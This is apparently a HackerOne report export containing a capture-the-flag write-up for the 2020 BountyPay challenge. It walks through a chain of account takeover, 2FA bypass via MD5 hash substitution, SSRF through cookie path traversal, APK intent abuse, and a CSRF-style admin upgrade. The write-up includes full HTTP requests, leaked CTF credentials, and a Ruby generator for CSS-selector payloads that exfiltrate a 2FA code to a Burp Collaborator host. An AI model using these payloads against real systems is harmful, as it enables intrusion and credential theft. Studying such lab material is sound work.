{
  "id": 888331,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODgzMzE=",
  "url": "https://hackerone.com/reports/888331",
  "title": "[H1-2006 2020]  ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-06-01T10:40:47.915Z",
  "submitted_at": "2020-06-01T10:40:47.915Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "pirateducky",
    "url": "/pirateducky",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-06-18T15:24:52.434Z",
  "bug_reporter_agreed_on_going_public_at": "2020-06-18T13:36:17.931Z",
  "team_member_agreed_on_going_public_at": "2020-06-18T15:24:52.370Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Still working on the report figured I should turn it in though :D\n\n## Impact\n\nhugeee",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [

  ],
  "allow_singular_disclosure_at": "2020-07-18T13:36:17.973Z",
  "allow_singular_disclosure_after": -100374705.14475112,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "sw33tlie",
    "nytr0gen",
    "dee-see",
    "brahim_boufakri01"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 48138,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.bountypay.h1ctf.com",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 8222184,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "{F857599}\nAs before the CTF started with a tweet from the H1 account - CEO @martenmickos needs to approve the May bug bounty payments but he lost his credentials for BountyPay - I might be able to help.\n\n----------------------------------------------------------------------------------------------\n### summary\nI was able to retrieve the CEO's account & pay the hackers by using a chain of exploits:\n\ninformation disclosure(github repo) â†’ account takeover(brian.oliver) + 2FA bypass -> ssrf to download private apk â†’ token leaked in apk â†’ account takeover(sandra.allison) + privilege escalation(csrf) â†’ account takeover(marten.mickos) + 2FA bypass\n\n**password:** h&H5wy2Lggj*kKn4OD&Ype\n\n#### PoC\n{F857587}\n\nI attached the script in which I automated everything except the android part ðŸ¤–\n```bash\n$ gem install httparty nokogiri colorize\n$ ruby pwn-script.rb\n``` \n{F857598}\n\n### details\nThere's a H1 page for the program so let's check out the scope\n\n`scope: *.bountypay.h1ctf.com`\n\nThat's a wide scope - the best thing to do is to start with some subdomain enumeration, let's see what else is under that `bountypay` subdomain:\n\n- [api.bountypay.h1ctf.com](http://api.bountypay.h1ctf.com/)\n    - requires a token\n    - `/redirect?url=`\n- [www.bountypay.h1ctf.com](http://www.bountypay.h1ctf.com/)\n    - sign-in portal\n- [software.bountypay.h1ctf.com](http://software.bountypay.h1ctf.com/)\n    - apk is hosted here\n    - only accessible from known IP\n- [staff.bountypay.h1ctf.com](http://staff.bountypay.h1ctf.com/)\n    - staff portal\n    - `AIM` (administrators, regular staff)\n- [app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com/)\n    - customer portal\n    - 2 Factor Auth. is enabled\n\n### foothold\n\nAfter going through the subdomains and doing some directory bruteforcing - there was a `403` error that looked promising: `app.bountypay.h1ctf.com/.git/`, let's see if someone left some `git` files for us to view.\n\nIf you hit `http://app.bountypay.h1ctf.com/.git/HEAD` you can download the `HEAD` file - now we just need to get something with more information for us, let's try [`https://app.bountypay.h1ctf.com/.git/config`](https://app.bountypay.h1ctf.com/.git/config) This discloses some information:\n\n```bash\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\nThis config file discloses a [github](https://github.com/bounty-pay-code/request-logger.git) repository with some interesting information\n```php\n<?php\n\n$data = array(\n  'IP'        =>  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =>  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =>  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =>  array(\n      'GET'   =>  $_GET,\n      'POST'  =>  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\nA few things to note here:\n- Application uses PHP\n- Writes to a log file that we can access from [`https://app.bountypay.h1ctf.com/bp_web_trace.log`](https://app.bountypay.h1ctf.com/bp_web_trace.log) in it we can see the following:\n  - The values are encoded using `base64`\n  - \"username\":\"brian.oliver\",\n  - \"password\":\"V7h0inzX\",\n  - \"challenge_answer\":\"bD83Jk27dQ\"\n\n\n### app.bountypay.h1ctf.com\n\nUsing the `username/password` works and we can now log into `[app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com)` however...there's `2 Factor Auth` we'll need to bypass it.\n{F857589}\n```html\n<!-- relevant html from above-->\n...\n<!-- user's name -->\n<input type=\"hidden\" name=\"username\" value=\"brian.oliver\">\n<!-- user's password -->\n<input type=\"hidden\" name=\"password\" value=\"V7h0inzX\">\n<!-- MD5 hash of the 10 char passcode sent to the user for verification -->\n<input type=\"hidden\" name=\"challenge\" value=\"103fa83db8f4be6c61dee66f95e2bca0\">\n...\n```\n\nWe can assume the application will send a verification code but how can we grab it? \n\nI had not noticed but the `challenge` value is 32 chars - after some time I realized `MD5` hashes have 32 chars, if we replace the `challenge` value for the `MD5` hash of the `challenge_answer` we found in the logs(bD83Jk27dQ) we can use this old token to gain access to the account. With this we can log into [app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com)\n\n### app.bountypay.h1ctf.com\n\nThe user `brian.oliver` has access to this application, however there wasn't much else so I started looking at `api` calls - I noticed the `/statements?month=04&year=2020` request which was in the log file from before, and this is what it returned:\n```json\n{\n   \"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01&year=2020\",\n   \"data\":\"{\\\"description\\\":\\\"Transactions for 2020-01\\\",\\\"transactions\\\":[]}\"\n}\n```\nLooks like it's using `api.bountypay.h1ctf.com` to get the information and then it returns a data object with the information - let's remember this and keep going.\n\nEventually I looked at the `Cookie` values, and with some nudges noticed there was a path traversal in the cookie, which was just `base64` json, the account_id probably gets passed to the api call to get the right account - this is when the `/redirect?url=` route from `api.bountypay.h1ctf.com` came in handy since before we couldn't make any interesting requests because there was a `whitelist` - here it's also important to note the `software.bountypay.h1ctf.com` subdomain which you can't access because there's an IP restriction(I tried the `X-Forward-Host` but it didn't work), taking that into consideration - let's try to make an internal request to that subdomain by using the following `base64` encoded payload:\n\n```json\n// decoded cookie\n{\"account_id\":\"8FJ3KFISL3/../../../redirect?url=https://software.bountypay.h1ctf.com/BountyPay.apk#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2In0\"}\n\n// request\nGET /statements?month=04&year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSy8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tLyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ\n\n// response\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Mon, 01 Jun 2020 22:58:07 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 1621\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/..\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/#\\/statements?month=04&year=2020\",\"data\":\"<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n<head>\\n    <meta charset=\\\"utf-8\\\">\\n    <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\">\\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1\\\">\\n    <title>Software Storage<\\/title>\\n    <link href=\\\"\\/css\\/bootstrap.min.css\\\" rel=\\\"stylesheet\\\">\\n<\\/head>\\n<body>\\n\\n<div class=\\\"container\\\">\\n    <div class=\\\"row\\\">\\n        <div class=\\\"col-sm-6 col-sm-offset-3\\\">\\n            <h1 style=\\\"text-align: center\\\">Software Storage<\\/h1>\\n            <form method=\\\"post\\\" action=\\\"\\/\\\">\\n                <div class=\\\"panel panel-default\\\" style=\\\"margin-top:50px\\\">\\n                    <div class=\\\"panel-heading\\\">Login<\\/div>\\n                    <div class=\\\"panel-body\\\">\\n                        <div style=\\\"margin-top:7px\\\"><label>Username:<\\/label><\\/div>\\n                        <div><input name=\\\"username\\\" class=\\\"form-control\\\"><\\/div>\\n                        <div style=\\\"margin-top:7px\\\"><label>Password:<\\/label><\\/div>\\n                        <div><input name=\\\"password\\\" type=\\\"password\\\" class=\\\"form-control\\\"><\\/div>\\n                    <\\/div>\\n                <\\/div>\\n                <input type=\\\"submit\\\" class=\\\"btn btn-success pull-right\\\" value=\\\"Login\\\">\\n            <\\/form>\\n        <\\/div>\\n    <\\/div>\\n<\\/div>\\n<script src=\\\"\\/js\\/jquery.min.js\\\"><\\/script>\\n<script src=\\\"\\/js\\/bootstrap.min.js\\\"><\\/script>\\n<\\/body>\\n<\\/html>\"}\n```\nThe `data` json contains the login page for `software.bountypay.h1ctf.com` - this means we have a way to make requests inside the network, bypassing the ip restriction aka ssrf :yay: \nAfter some time of thinking what could be there I figure it would have something to download and it made sense, a lot of companies host software on a different subdomain under `/downloads, /software` or in this case `/uploads` making the correct request yields\n\n```bash\n# decoded cookie\n{\"account_id\":\"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/uploads#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n\n# request\nGET /statements?month=04&year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSy8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tL3VwbG9hZHMjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=\n\n# data response\n\"data\":\"<html>\\n<head><title>Index of \\/uploads\\/<\\/title><\\/head>\\n<body bgcolor=\\\"white\\\">\\n<h1>Index of \\/uploads\\/<\\/h1><hr><pre><a href=\\\"..\\/\\\">..\\/<\\/a>\\n<a href=\\\"\\/uploads\\/BountyPay.apk\\\">BountyPay.apk<\\/a>                                        20-Apr-2020 11:26              4043701\\n<\\/pre><hr><\\/body>\\n<\\/html>\\n\"\n```\nWe can see what's hosted there ðŸ‘€ now you can download the `apk` by going to: [https://software.bountypay.h1ctf.com/uploads/BountyPay.apk](https://software.bountypay.h1ctf.com/uploads/BountyPay.apk) \n\n### apk\n\nThis part was hard for me, but thanks again to Al-Madjus I was able to complete it using `adb` and generating intents with the correct payloads, all the information was inside the apk.\n\nI used `android studio` and `adb` (if you have the emulator running you just need to run a shell by using `adb` `$ adb shell`)to complete the challenges:\n\n- ActivityOne\n    - `am start -a android.intent.action.VIEW -d \"one://part?start=PartTwoActivity\" -n bounty.pay/.PartOneActivity`\n- ActivityTwo\n    - `am start -a android.intent.action.VIEW -d \"two://part?two=light&switch=on\" -n bounty.pay/.PartTwoActivity`\n- ActivityThree\n    - `am start -a android.intent.action.VIEW -d \"three://part?three=UGFydFRocmVVlQWN0aXZpdHk=&switch=b24=&header=X-Token\" -n bounty.pay/.PartThreeActivity`\n- Header value: `X-Token: 8e9998ee3137ca9ade8f372739f062c1` \n\nAll the params were in the `apk` - once you read the disassembled code you could see the flow of the program and use those to create the intents you needed - again huge thanks to AlMadjus for the help here.\n\nAfter completing this challenge we have access to a leaked token: `X-Token: 8e9998ee3137ca9ade8f372739f062c1` which I grabbed from the cat log from android studi.\nWe also know that we need to add that header with the token somewhere - if I remember correctly one of the subdomains asked specifically for a token when making requests directly to it: `api.bountypay.h1ctf.com`\n\n### api.bountypay.h1ctf.com\n\nUsing the new `X-Token: 8e9998ee3137ca9ade8f372739f062c1` header, let's test the `api` endpoint and see if I can now make requests, I found the `/api/staff` endpoint which yields:\n\n```json\n[{\n\t\"name\":\"Sam Jenkins\",\n\t\"staff_id\":\"STF:84DJKEIP38\"\n},\n{\n\t\"name\":\"Brian Oliver\",\n\t\"staff_id\":\"STF:KE624RQ2T9\"\n}]\n```\n\nHere I took a small detour and went on twitter - the [HackerOne](https://twitter.com/BountypayHQ/status/1258692145252270080) account released some clues, including a twitter account for `bountypay` which only followed three accounts which included the [newest](https://twitter.com/SandraA76708114) employee and she even shared a pic of her cool new work badge with her `STF` number on it- let's use that try to use that somewhere.\nIn the above `GET` request to `/api/staff` we get the current employees and their `staff_id` which is the same format that Sandra's badge has! but she's not in the system yet? Maybe she hasn't gotten set up yet? Let's help her out. After sending an inital `POST` request without any parms I received this error `\"Missing Parameter\"` so what paramet can we pass? her name? I don't think so maybe her staff_id is workin - let's try it:\n\n```bash\n// POST to create an account using th STF number in the image\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nConnection: close\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:8FJ3KFISL3\n\n// response with username and password! \nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 31 May 2020 22:11:43 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\nNow we have a `staff` account! which should work for the `staff.bountypay.h1ctf.com`\n\n### staff.bountypay.h1ctf.com\nWith our new `staff` account we can sign into the [staff.bountypay.h1ctf.com](http://staff.bountypay.h1ctf.com) application, there's a few things to note here:\n\n1. We get some clientside `js`\n    - `/js/website.js`\n2. The account is **not** admin and we probably need admin rights to see more\n    - `/template=admin` gives 403\n3. We control the `profile_avatar` input name since we can change it clientside however sensitive chars are filtered, we also control our user name but this wasn't of much use here\n    - injection is possible though \n\nWhen looking at the `website.js` file I noticed \n- The `upgradeToAdmin` function, I tried to hit the route myself but only admins can do it (it's a `GET` request to /admin/upgrade?username=sandra.allison)\n- The `sendReport` function that submits a `url` which is generated by the app and it's `base64 encoded` the url is generated for each page - the modal mentions an admin will take a look at the page, this is great if we can trick the admin into making that upgrade request for us, we could become admins too. \n\n```javascript\n// javascript from the application\n$('.upgradeToAdmin').click(function () {\n  let t = $('input[name=\"username\"]').val();\n  $.get('/admin/upgrade?username=' + t, function () {\n    alert('User Upgraded to Admin')\n  })\n}),\n$('.tab').click(function () {\n  return $('.tab').removeClass('active'),\n  $(this).addClass('active'),\n  $('div.content').addClass('hidden'),\n  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),\n  !1\n}),\n$('.sendReport').click(function () {\n  $.get('/admin/report?url=' + url, function () {\n    alert('Report sent to admin team')\n  }),\n  $('#myModal').modal('hide')\n}),\ndocument.location.hash.length > 0 \n&& ('#tab1' === document.location.hash \n&& $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));}\n```\n\n### document.hash\n\nI spent a lot of time trying to get `xss` since there was an html injection in the `avatar_name` input value when choosing an avatar under the `Profile` tab. I realized I controlled a field that gets echoed back as a class and if I could just trigger the `.upgradeToAdmin` function, I might be able to store that in the `profile_avatar` variable that I control, the last part was getting the admin to make the request. \n\nHow do we trigger the function though? \nWell since we control a class and there's a class that get's used in the `jquery` above to check the tabs and then fire their `click` events could we take advantage of that event and use it for our purposes? Yes we can! \n{F853204}\nBy setting a avatar with the `avatar_name` input value  to `tab1 upgradeToAdmin` and then accessing the hash we set in our `avatar_name` directly [https://staff.bountypay.h1ctf.com/#tab1](https://staff.bountypay.h1ctf.com/#tab1) this makes the `click` event propagate, and it even makes the request for us since it fires off the `click` event for `upgradeToAdmin` however - we are missing something:\n\n```\n// upgradeToAdmin function \nlet t = $('input[name=\"username\"]').val();\n```\n\nThe function needs to grab the username from an input field, I knew I was on the right track because I could see the request to `/admin/upgrade?username=undefined`. The `undefined` happened because the function that triggered the request grabs the `username` from an input field named `username` which is no where in the application - or is it? \n\n> the event propagation surprised me and at first I didn't understand it but after debugging the jquery it hit me that since the location hash was being used to fire off a `click` event the event propagation would make any class that was in the same element fire off any click events that were associated with that class and luckily for us the request we need to make is handled by a click event bound to a class - with our injection we can inject the class that starts the click event and then the class name that fires our get request\n\n### input[name='username'].val()\n\nThis is the last part before we can send our admin a malicious link that will upgrade us, but how can we get that `username` parameter? \nThe only input with the `username` value is the login page - I knew we had to include that page since there's no other way, and we know we are using templates because the route we are on is `/?template=home` since we need to pull multiple templates I thought about array params - which even `hackerone` uses and made the following request [https://staff.bountypay.h1ctf.com/?template[]=home&template[]=login](https://staff.bountypay.h1ctf.com/?template%5B%5D=home&template%5B%5D=login)\n{F857590}\nBuilding up from this we can change our payload slightly to fill in the `username` and make sure we direct the admin to a page where our username will be seen since the only part of the application that is not in the `/template=home` is the ticket where our username is available to the admin and we need to make sure the class we set is seen by the admin to trigger the attack so let's just send the admin there with our full payload:\n\n[https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab2](https://staff.bountypay.h1ctf.com/?template%5B%5D=login&username=sandra.allison&template%5B%5D=ticket&ticket_id=3582#tab2)\n\nThis will take the admin to the ticket template but will also pull in the login template and use the input field with our username - now when the admin receives this payload it will trigger the attack, to do this we can send a report to `/admin/report?url=base64` the `base64` will be our payload since that includes our malicious link - now this will trigger the admin to make the upgrade request and we will become application admininstrator:\n\nNow all we need is to set the `avatar_name` value to `tab2 upgrateToAdmin` in the profile tab, submit the change, and then send the report to the admin:\n\n[https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE=](https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE=)\n\nThis request will trigger the `upgradeToAdmin` from the admin's side - giving us admin rights!\n\n### Admin\n\nNow that we are admin there's a new tab! With the CEO's account and password (which he forgot - should have been admin:admin)\n\n{F857591}\n\nSo what's left to do? Login of course! this account will work in [app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com) - when you login you'll need to bypass the  `2FA` again this time we don't have a used security code so just make one up `12345aBcDF= b3e2bc9cbb5e0b624816fa0ee19a7993` exchange the `challenge` value for the `md5` hash and it should allow you to log in - now let's pay those hackers!\n{F857592}\nIf you try to use the `pay` button you'll be redirected to...another 2FA - this one is not as easy as a `md5` hash. Let's take a look at the `2FA` page and html that we got to work with\n\n```html\n...\n<!--important part -->\n<form method=\"post\">\n<input type=\"hidden\" name=\"app_style\" value=\"https://www.bountypay.h1ctf.com/css/uni_2fa_style.css\">\n...\n```\n\nThis snippet caught my eye - they're sending the styling for what I believe is the `2FA` application to grab the code - I replaced the css link and put a `burp` collaborator link to see if I could get a response from wherever that request ended up at and...\n{F857593}\nNow we're talking - but this was done through a css link, also how in the f*** do I exfiltrate this with just css? \n\nOne thing I noticed from the css that was originally there was the rules and comment from the css style made me think that I needed to steal a token from an application that looked like your typical `2FA` app with multiple input fields: [][][][][][][]\n\n### css data exfiltration\n\nWho would I tell I'd be exfiltrating information using `css selectors` - 2020 is a strange year. \n\nRealizing that was a posibility thanks to [d0nut](https://twitter.com/d0nutptr) and the blog he wrote [here](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b). I could technically add my own `css` stylesheet by submitting one in a server I controlled - with this and some crafty payloads I was able to grab all the `inputs` \n\nI was able to find the chars I needed by:\n\n- hosting a css file with my payloads on a server I controlled (I used netlify since they give u a server in which you can host js, css files, and comes with a SSL cert)\n- payloads were generated based on the criteria I needed\n    - charset: [a-z][A-Z][0-9]\n    - 7 characters (that's how many fit in the input field)\n    - Generated a list that would only execute the css rule each time a match was found, when the css selector would find a match it would execute the rule which in this case made a request to the `collaborator` along with the match and the placement.\n    - burp helped since I attached the current character and place (based on the nth-of-type(n) selector)\n    - Example payload\n        - input[value=a]:nth-of-type(1){background-image:url(\"[https://hellothere.burpcollaborator.net.burpcollaborator.net?char=a&order=1](https://jl8b9zsipw6zj5g9q4f2kpvf369zxo.burpcollaborator.net.burpcollaborator.net/?a=A&i=1)\");}\n        - if the css found that the first input had a value of `a` I would get a callback to my collaborator instance with the character and it's index\n    - I had about 400 css rules\n\n```ruby\n# creates a wordlist with css rules to find the auth code\nchars = (0..9).to_a + ('A'..'Z').to_a + ('a'..'z').to_a\n\nputs \"server/burp collaborator\"\n\nserver = gets.chomp\nfor i in 0..6\n\tchars.each do |char|\n\t\tputs \"input[value=#{char}]:nth-of-type(#{i + 1}){background-image:url('#{server}/?char=#{char}&index=#{i + 1}');}\"\n\tend\nend\n```\n\nThis took...a few tries but finally I managed to grab the right code and....\n{F857595}\n### Thoughts\n\nI just want to say thank you to H1 and everyone involved in making these challenges, my first one was back in 2018 for DefCon, and I failed miserably. I told myself I would give it my best and I think I did just that. As always awesome challenge - I walked away with some new knowledge and more appreciation for css ðŸ¦†. \n",
      "automated_response": false,
      "created_at": "2020-06-07T01:57:24.907Z",
      "updated_at": "2020-06-07T01:57:24.907Z",
      "actor": {
        "username": "pirateducky",
        "cleared": false,
        "verified": false,
        "url": "/pirateducky",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 857599,
          "filename": "Screen_Shot_2020-06-01_at_7.28.31_AM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/emrHgwaZ5eaKghdsemMuZfUp?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_7.28.31_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_7.28.31_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aec4d874db06e4a19f116ea06f2293caf313f4f991d4ced0007d0493be1addfa"
        },
        {
          "id": 857598,
          "filename": "pwn-script.rb",
          "type": "text/x-ruby-script",
